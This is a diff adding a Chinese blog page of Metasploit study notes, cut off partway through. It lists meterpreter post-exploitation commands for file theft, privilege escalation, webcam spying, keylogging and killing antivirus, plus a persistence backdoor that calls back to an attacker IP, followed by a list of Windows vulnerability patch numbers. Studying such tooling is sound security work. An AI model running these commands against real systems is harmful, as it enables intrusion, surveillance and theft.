@@ -1,0 +1,640 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon/cat.png">
+  <link rel="icon" href="/img/icon/cat.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Svanur">
+  <meta name="keywords" content="Svanur">
+  
+    <meta name="description" content="MSF是一个功能比较齐全的框架  meterpreter常用命令基本命令123456789101112131415161718192021help# 查看Meterpreter帮助background#返回，把meterpreter后台挂起bgkill# 杀死一个背景 meterpreter 脚本bglist#提供所有正在运行的后台脚本的列表bgrun#作为一个后台线程运行脚本channel#显">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MSF额外知识">
+<meta property="og:url" content="http://example.com/2024/10/21/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%90%8E%E6%B8%97%E9%80%8F/ATT-CKMSF/MSF%E9%A2%9D%E5%A4%96%E7%9F%A5%E8%AF%86/index.html">
+<meta property="og:site_name" content="Svanur&#39;s Blog">
+<meta property="og:description" content="MSF是一个功能比较齐全的框架  meterpreter常用命令基本命令123456789101112131415161718192021help# 查看Meterpreter帮助background#返回，把meterpreter后台挂起bgkill# 杀死一个背景 meterpreter 脚本bglist#提供所有正在运行的后台脚本的列表bgrun#作为一个后台线程运行脚本channel#显">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-10-20T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-11-18T11:11:19.281Z">
+<meta property="article:author" content="Svanur">
+<meta property="article:tag" content="Svanur">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>MSF额外知识 - Svanur&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>我的学习记录</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/bg/index_bg.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="MSF额外知识"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-10-21 00:00" pubdate>
+          2024年10月21日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          11 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">MSF额外知识</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <blockquote>
+<p>MSF是一个功能比较齐全的框架</p>
+</blockquote>
+<h2 id="meterpreter常用命令"><a href="#meterpreter常用命令" class="headerlink" title="meterpreter常用命令"></a>meterpreter常用命令</h2><h3 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs awk">help<span class="hljs-comment"># 查看Meterpreter帮助</span><br>background<span class="hljs-comment">#返回，把meterpreter后台挂起</span><br>bgkill<span class="hljs-comment"># 杀死一个背景 meterpreter 脚本</span><br>bglist<span class="hljs-comment">#提供所有正在运行的后台脚本的列表</span><br>bgrun<span class="hljs-comment">#作为一个后台线程运行脚本</span><br>channel<span class="hljs-comment">#显示活动频道</span><br>sessions -i number <span class="hljs-comment"># 与会话进行交互，number表示第n个session,使用session -i 连接到指定序号的meterpreter会话已继续利用</span><br>sesssions -k  number <span class="hljs-comment">#与会话进行交互</span><br>close<span class="hljs-comment"># 关闭通道</span><br><span class="hljs-keyword">exit</span><span class="hljs-comment"># 终止 meterpreter 会话</span><br>quit<span class="hljs-comment"># 终止 meterpreter 会话</span><br>interact id <span class="hljs-comment">#切换进一个信道</span><br>run<span class="hljs-comment">#执行一个已有的模块，这里要说的是输入run后按两下tab，会列出所有的已有的脚本，常用的有autoroute,hashdump,arp_scanner,multi_meter_inject等</span><br>irb<span class="hljs-comment"># 进入 Ruby 脚本模式</span><br>read<span class="hljs-comment"># 从通道读取数据</span><br>write<span class="hljs-comment"># 将数据写入到一个通道</span><br>run和bgrun<span class="hljs-comment"># 前台和后台执行以后它选定的 meterpreter 脚本</span><br>use<span class="hljs-comment"># 加载 meterpreter 的扩展</span><br>load/use<span class="hljs-comment">#加载模块</span><br>Resource<span class="hljs-comment">#执行一个已有的rc脚本</span><br><br></code></pre></td></tr></table></figure>
+
+<h3 id="文件系统命令"><a href="#文件系统命令" class="headerlink" title="文件系统命令"></a>文件系统命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">getwd 或者<span class="hljs-built_in">pwd</span> <span class="hljs-comment"># 查看当前工作目录  </span><br><span class="hljs-built_in">ls</span>  <span class="hljs-comment">#</span><br><span class="hljs-built_in">cd</span><br><span class="hljs-built_in">mkdir</span> lltest2  <span class="hljs-comment">#只能在当前目录下创建文件夹</span><br><span class="hljs-built_in">rmdir</span> lltest2  <span class="hljs-comment">#只能删除当前目录下文件夹</span><br>getlwd   或者 lpwd   <span class="hljs-comment">#操作攻击者主机 查看当前目录</span><br>lcd /tmp   <span class="hljs-comment">#操作攻击者主机 切换目录</span><br><span class="hljs-built_in">cat</span> c:\\lltest\\lltestpasswd.txt  <span class="hljs-comment"># 查看文件内容</span><br>upload /tmp/hack.txt C:\\lltest  <span class="hljs-comment"># 上传文件到目标机上</span><br>download c:\\lltest\\lltestpasswd.txt /tmp/ <span class="hljs-comment"># 下载文件到本机上</span><br>edit c:\\1.txt <span class="hljs-comment">#编辑或创建文件  没有的话，会新建文件</span><br><br></code></pre></td></tr></table></figure>
+
+<h3 id="系统命令"><a href="#系统命令" class="headerlink" title="系统命令"></a>系统命令</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs awk">getsystem       <span class="hljs-comment">#会自动利用各种各样的系统漏洞来进行权限提升</span><br>migrate          <span class="hljs-comment">#进程id进程迁移</span><br>background     <span class="hljs-comment">#把当前的会话设置为背景，需要的时候在启用</span><br>getuid           <span class="hljs-comment">#查看对方正在运行的用户</span><br>ps              <span class="hljs-comment">#列出所有的进程</span><br>getpid          <span class="hljs-comment">#返回运行meterpreter的id号</span><br>sysinfo         <span class="hljs-comment">#产看系统信息和体系结构</span><br>shell           <span class="hljs-comment">#切换到cmd的系统权限方式</span><br><span class="hljs-keyword">exit</span>           <span class="hljs-comment">#退出shell会话返回meterpreter或终止meterpreter</span><br>getdesktop    截取目标主机当前桌面会话窗口<br>run webcam -p <span class="hljs-regexp">/var/</span>www    <span class="hljs-comment">#在/var/www目录监控目标主机的摄像头</span><br>keylog_recorder   <span class="hljs-comment">#使用migrate将会话迁移至explorer.exe的进程空间后记录键盘</span><br><br></code></pre></td></tr></table></figure>
+
+<h3 id="远程桌面-截屏"><a href="#远程桌面-截屏" class="headerlink" title="远程桌面&amp;截屏"></a>远程桌面&amp;截屏</h3><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-keyword">run</span> getgui -e <span class="hljs-meta">#开启远程桌面</span><br><span class="hljs-keyword">run</span> getgui -u user1 -p <span class="hljs-number">123</span>   <span class="hljs-meta">#添加用户</span><br><span class="hljs-keyword">run</span> getgui -f <span class="hljs-number">4444</span> –e   <span class="hljs-meta">#3389端口转发到6661</span><br>enumdesktops  <span class="hljs-meta">#查看可用的桌面</span><br>getdesktop    <span class="hljs-meta">#获取当前meterpreter 关联的桌面</span><br>set_desktop   <span class="hljs-meta">#设置meterpreter关联的桌面  -h查看帮助</span><br>screenshot  <span class="hljs-meta">#截屏</span><br><span class="hljs-keyword">use</span> espia  <span class="hljs-meta">#或者使用espia模块截屏  然后输入screengrab</span><br><span class="hljs-keyword">run</span> vnc  <span class="hljs-meta">#使用vnc远程桌面连接，这方法有点问题，上传了exe但是启动不了</span><br><br></code></pre></td></tr></table></figure>
+
+<h3 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">keyscan_start</span>  <span class="hljs-comment">#开始键盘记录</span><br>keyscan_dump   <span class="hljs-comment">#导出记录数据</span><br>keyscan_stop <span class="hljs-comment">#结束键盘记录</span><br><br></code></pre></td></tr></table></figure>
+
+<h3 id="关闭杀毒软件"><a href="#关闭杀毒软件" class="headerlink" title="关闭杀毒软件"></a>关闭杀毒软件</h3><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">run killav     <span class="hljs-comment">//可能导致目标机器蓝屏死机</span><br><br></code></pre></td></tr></table></figure>
+
+<h3 id="后门植入"><a href="#后门植入" class="headerlink" title="后门植入"></a>后门植入</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css">run persistence –h  #查看帮助<br>run persistence -<span class="hljs-attribute">X</span> -<span class="hljs-selector-tag">i</span> <span class="hljs-number">5</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-number">4444</span> -<span class="hljs-attribute">r</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">1.159</span><br><span class="hljs-selector-id">#-X</span>指定启动的方式为开机自启动；-<span class="hljs-selector-tag">i</span>反向连接的时间间隔；–<span class="hljs-attribute">r</span> 指定攻击者的ip<br><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="常见漏洞的补丁号"><a href="#常见漏洞的补丁号" class="headerlink" title="常见漏洞的补丁号"></a>常见漏洞的补丁号</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs css">MS17-<span class="hljs-number">010</span> 　<span class="hljs-selector-attr">[KB4013389]</span> <span class="hljs-selector-attr">[Windows 内核模式驱动程序]</span> (windows <span class="hljs-number">7</span>/<span class="hljs-number">2008</span>/<span class="hljs-number">2003</span>/XP)<br>MS16-<span class="hljs-number">135</span> 　<span class="hljs-selector-attr">[KB3199135]</span> <span class="hljs-selector-attr">[Windows 内核模式驱动程序]</span> (<span class="hljs-number">2016</span>)<br>MS16-<span class="hljs-number">111</span> 　<span class="hljs-selector-attr">[KB3186973]</span> <span class="hljs-selector-attr">[内核 API]</span> (Windows <span class="hljs-number">10</span> <span class="hljs-number">10586</span> (<span class="hljs-number">32</span>/<span class="hljs-number">64</span>)/<span class="hljs-number">8.1</span>)<br>MS16-<span class="hljs-number">098</span> 　<span class="hljs-selector-attr">[KB3178466]</span> <span class="hljs-selector-attr">[内核驱动程序]</span> (Win <span class="hljs-number">8.1</span>)<br>MS16-<span class="hljs-number">075</span> 　<span class="hljs-selector-attr">[KB3164038]</span> <span class="hljs-selector-attr">[热土豆]</span> (<span class="hljs-number">2003</span>/<span class="hljs-number">2008</span>/<span class="hljs-number">7</span>/<span class="hljs-number">8</span>/<span class="hljs-number">2012</span>)<br>MS16-<span class="hljs-number">034</span> 　<span class="hljs-selector-attr">[KB3143145]</span> <span class="hljs-selector-attr">[内核驱动程序]</span> (<span class="hljs-number">2008</span>/<span class="hljs-number">7</span>/<span class="hljs-number">8</span>/<span class="hljs-number">10</span>/<span class="hljs-number">2012</span>)<br>MS16-<span class="hljs-number">032</span> 　<span class="hljs-selector-attr">[KB3143141]</span> <span class="hljs-selector-attr">[辅助登录句柄]</span> (<span class="hljs-number">2008</span>/<span class="hljs-number">7</span>/<span class="hljs-number">8</span>/<span class="hljs-number">10</span>/<span class="hljs-number">2012</span>)<br>MS16-<span class="hljs-number">016</span> 　<span class="hljs-selector-attr">[KB3136041]</span> <span class="hljs-selector-attr">[WebDAV]</span> (<span class="hljs-number">2008</span>/Vista/<span class="hljs-number">7</span>)<br>MS16-<span class="hljs-number">014</span> 　<span class="hljs-selector-attr">[K3134228]</span> <span class="hljs-selector-attr">[远程代码执行]</span> (<span class="hljs-number">2008</span>/Vista/<span class="hljs-number">7</span>)<br>MS15-<span class="hljs-number">097</span> 　<span class="hljs-selector-attr">[KB3089656]</span> <span class="hljs-selector-attr">[远程代码执行]</span> (win8.<span class="hljs-number">1</span>/<span class="hljs-number">2012</span>)<br>MS15-<span class="hljs-number">076</span> 　<span class="hljs-selector-attr">[KB3067505]</span> <span class="hljs-selector-attr">[RPC]</span> (<span class="hljs-number">2003</span>/<span class="hljs-number">2008</span>/<span class="hljs-number">7</span>/<span class="hljs-number">8</span>/<span class="hljs-number">2012</span>)<br>MS15-<span class="hljs-number">077</span> 　<span class="hljs-selector-attr">[KB3077657]</span> <span class="hljs-selector-attr">[ATM]</span> (XP/Vista/Win7/Win8/<span class="hljs-number">2000</span>/<span class="hljs-number">2003</span>/<span class="hljs-number">2008</span>/<span class="hljs-number">2012</span>)<br>MS15-<span class="hljs-number">061</span> 　<span class="hljs-selector-attr">[KB3057839]</span> <span class="hljs-selector-attr">[内核驱动程序]</span> (<span class="hljs-number">2003</span>/<span class="hljs-number">2008</span>/<span class="hljs-number">7</span>/<span class="hljs-number">8</span>/<span class="hljs-number">2012</span>)<br>MS15-<span class="hljs-number">051</span> 　<span class="hljs-selector-attr">[KB3057191]</span> <span class="hljs-selector-attr">[Windows内核模式驱动程序]</span>（<span class="hljs-number">2003</span>/<span class="hljs-number">2008</span>/<span class="hljs-number">7</span>/<span class="hljs-number">8</span>/<span class="hljs-number">2012</span>）<br>MS15-<span class="hljs-number">015</span> 　<span class="hljs-selector-attr">[KB3031432]</span> <span class="hljs-selector-attr">[内核驱动程序]</span> (Win7/<span class="hljs-number">8</span>/<span class="hljs-number">8.1</span>/<span class="hljs-number">2012</span>/RT/<span class="hljs-number">2012</span> R2/<span class="hljs-number">2008</span> R2)<br>MS15-<span class="hljs-number">010</span> 　<span class="hljs-selector-attr">[KB3036220]</span> <span class="hljs-selector-attr">[内核驱动程序]</span> (<span class="hljs-number">2003</span>/<span class="hljs-number">2008</span>/<span class="hljs-number">7</span>/<span class="hljs-number">8</span>)<br>MS15-<span class="hljs-number">001</span> 　<span class="hljs-selector-attr">[KB3023266]</span> <span class="hljs-selector-attr">[内核驱动程序]</span> (<span class="hljs-number">2008</span>/<span class="hljs-number">2012</span>/<span class="hljs-number">7</span>/<span class="hljs-number">8</span>)<br>MS14-<span class="hljs-number">070</span> 　<span class="hljs-selector-attr">[KB2989935]</span> <span class="hljs-selector-attr">[内核驱动程序]</span> (<span class="hljs-number">2003</span>)<br>MS14-<span class="hljs-number">068</span> 　<span class="hljs-selector-attr">[KB3011780]</span> <span class="hljs-selector-attr">[域权限提升]</span> (<span class="hljs-number">2003</span>/<span class="hljs-number">2008</span>/<span class="hljs-number">2012</span>/<span class="hljs-number">7</span>/<span class="hljs-number">8</span>)<br>MS14-<span class="hljs-number">058</span> 　<span class="hljs-selector-attr">[KB3000061]</span> <span class="hljs-selector-attr">[Win32k.sys]</span> (<span class="hljs-number">2003</span>/<span class="hljs-number">2008</span>/<span class="hljs-number">2012</span>/<span class="hljs-number">7</span>/<span class="hljs-number">8</span>)<br>MS14-<span class="hljs-number">066</span> 　<span class="hljs-selector-attr">[KB2992611]</span> <span class="hljs-selector-attr">[Windows Schannel 允许远程代码执行]</span> (VistaSP2/<span class="hljs-number">7</span> SP1/<span class="hljs-number">8</span>/Windows <span class="hljs-number">8.1</span>/<span class="hljs-number">2003</span> SP2/<span class="hljs-number">2008</span> SP2/<span class="hljs-number">2008</span> R2 SP1/<span class="hljs-number">2012</span>/<span class="hljs-number">2012</span> R2/Windows RT/Windows RT <span class="hljs-number">8.1</span>)<br>MS14-<span class="hljs-number">040</span> 　<span class="hljs-selector-attr">[KB2975684]</span> <span class="hljs-selector-attr">[AFD 驱动程序]</span> (<span class="hljs-number">2003</span>/<span class="hljs-number">2008</span>/<span class="hljs-number">2012</span>/<span class="hljs-number">7</span>/<span class="hljs-number">8</span>)<br>MS14-<span class="hljs-number">002</span> 　<span class="hljs-selector-attr">[KB2914368]</span> <span class="hljs-selector-attr">[NDProxy]</span> (<span class="hljs-number">2003</span>/XP)<br>MS13-<span class="hljs-number">053</span> 　<span class="hljs-selector-attr">[KB2850851]</span> <span class="hljs-selector-attr">[win32k.sys]</span> (XP/Vista/<span class="hljs-number">2003</span>/<span class="hljs-number">2008</span>/win <span class="hljs-number">7</span>)<br>MS13-<span class="hljs-number">046</span> 　<span class="hljs-selector-attr">[KB2840221]</span> <span class="hljs-selector-attr">[dxgkrnl.sys]</span> (Vista/<span class="hljs-number">2003</span>/<span class="hljs-number">2008</span>/<span class="hljs-number">2012</span>/<span class="hljs-number">7</span>)<br>MS13-<span class="hljs-number">005</span> 　<span class="hljs-selector-attr">[KB2778930]</span> <span class="hljs-selector-attr">[内核模式驱动程序]</span> (<span class="hljs-number">2003</span>/<span class="hljs-number">2008</span>/<span class="hljs-number">2012</span>/win7/<span class="hljs-number">8</span>)<br>MS12-<span class="hljs-number">042</span> 　<span class="hljs-selector-attr">[KB2972621]</span> <span class="hljs-selector-attr">[服务总线]</span> (<span class="hljs-number">2008</span>/<span class="hljs-number">2012</span>/win7)<br>MS12-<span class="hljs-number">020</span> 　<span class="hljs-selector-attr">[KB2671387]</span> <span class="hljs-selector-attr">[RDP]</span> (<span class="hljs-number">2003</span>/<span class="hljs-number">2008</span>/<span class="hljs-number">7</span>/XP)<br>MS11-<span class="hljs-number">080</span> 　<span class="hljs-selector-attr">[KB2592799]</span> <span class="hljs-selector-attr">[AFD.sys]</span> (<span class="hljs-number">2003</span>/XP)<br>MS11-<span class="hljs-number">062</span> 　<span class="hljs-selector-attr">[KB2566454]</span> <span class="hljs-selector-attr">[NDISTAPI]</span> (<span class="hljs-number">2003</span>/XP)<br>MS11-<span class="hljs-number">046</span> 　<span class="hljs-selector-attr">[KB2503665]</span> <span class="hljs-selector-attr">[AFD.sys]</span> (<span class="hljs-number">2003</span>/<span class="hljs-number">2008</span>/<span class="hljs-number">7</span>/XP)<br>MS11-<span class="hljs-number">011</span> 　<span class="hljs-selector-attr">[KB2393802]</span> <span class="hljs-selector-attr">[内核驱动程序]</span> (<span class="hljs-number">2003</span>/<span class="hljs-number">2008</span>/<span class="hljs-number">7</span>/XP/Vista)<br>MS10-<span class="hljs-number">092</span> 　<span class="hljs-selector-attr">[KB2305420]</span> <span class="hljs-selector-attr">[任务计划程序]</span> (<span class="hljs-number">2008</span>/<span class="hljs-number">7</span>)<br>MS10-<span class="hljs-number">065</span> 　<span class="hljs-selector-attr">[KB2267960]</span> <span class="hljs-selector-attr">[FastCGI]</span>（IIS <span class="hljs-number">5.1</span>、<span class="hljs-number">6.0</span>、<span class="hljs-number">7.0</span> 和 <span class="hljs-number">7.5</span>）<br>MS10-<span class="hljs-number">059</span> 　<span class="hljs-selector-attr">[KB982799]</span> <span class="hljs-selector-attr">[ACL-Churraskito]</span> (<span class="hljs-number">2008</span>/<span class="hljs-number">7</span>/Vista)<br>MS10-<span class="hljs-number">048</span> 　<span class="hljs-selector-attr">[KB2160329]</span> <span class="hljs-selector-attr">[win32k.sys]</span> (XP SP2 &amp; SP3/<span class="hljs-number">2003</span> SP2/Vista SP1 &amp; SP2/<span class="hljs-number">2008</span> Gold &amp; SP2 &amp; R2/Win7)<br>MS10-<span class="hljs-number">015</span> 　<span class="hljs-selector-attr">[KB977165]</span> <span class="hljs-selector-attr">[KiTrap0D]</span> (<span class="hljs-number">2003</span>/<span class="hljs-number">2008</span>/<span class="hljs-number">7</span>/XP)<br>MS10-<span class="hljs-number">012</span> 　<span class="hljs-selector-attr">[KB971468]</span> <span class="hljs-selector-attr">[SMB 客户端 Trans2 堆栈溢出]</span> (Windows <span class="hljs-number">7</span>/<span class="hljs-number">2008</span>R2)<br>MS09-<span class="hljs-number">050</span> 　<span class="hljs-selector-attr">[KB975517]</span> <span class="hljs-selector-attr">[远程代码执行]</span> (<span class="hljs-number">2008</span>/Vista)<br>MS09-<span class="hljs-number">020</span> 　<span class="hljs-selector-attr">[KB970483]</span> <span class="hljs-selector-attr">[IIS 6.0]</span>（IIS <span class="hljs-number">5.1</span> 和 <span class="hljs-number">6.0</span>）<br>MS09-<span class="hljs-number">012</span> 　<span class="hljs-selector-attr">[KB959454]</span> <span class="hljs-selector-attr">[Chimichurri]</span> (Vista/win7/<span class="hljs-number">2008</span>/Vista)<br>MS08-<span class="hljs-number">068</span> 　<span class="hljs-selector-attr">[KB957097]</span> <span class="hljs-selector-attr">[远程代码执行]</span> (<span class="hljs-number">2000</span>/XP)<br>MS08-<span class="hljs-number">067</span> 　<span class="hljs-selector-attr">[KB958644]</span> <span class="hljs-selector-attr">[远程代码执行]</span> (Windows <span class="hljs-number">2000</span>/XP/Server <span class="hljs-number">2003</span>/Vista/Server <span class="hljs-number">2008</span>)<br>MS08-<span class="hljs-number">066</span> 　<span class="hljs-selector-attr">[KB956803]</span> <span class="hljs-selector-attr">[AFD.sys]</span> (Windows <span class="hljs-number">2000</span>/XP/Server <span class="hljs-number">2003</span>)<br>MS08-<span class="hljs-number">025</span> 　<span class="hljs-selector-attr">[KB941693]</span> <span class="hljs-selector-attr">[Win32.sys]</span> (XP/<span class="hljs-number">2003</span>/<span class="hljs-number">2008</span>/Vista)<br>MS06-<span class="hljs-number">040</span> 　<span class="hljs-selector-attr">[KB921883]</span> <span class="hljs-selector-attr">[远程代码执行]</span> (<span class="hljs-number">2003</span>/xp/<span class="hljs-number">2000</span>)<br>MS05-<span class="hljs-number">039</span> 　<span class="hljs-selector-attr">[KB899588]</span> <span class="hljs-selector-attr">[PnP 服务]</span> (Win <span 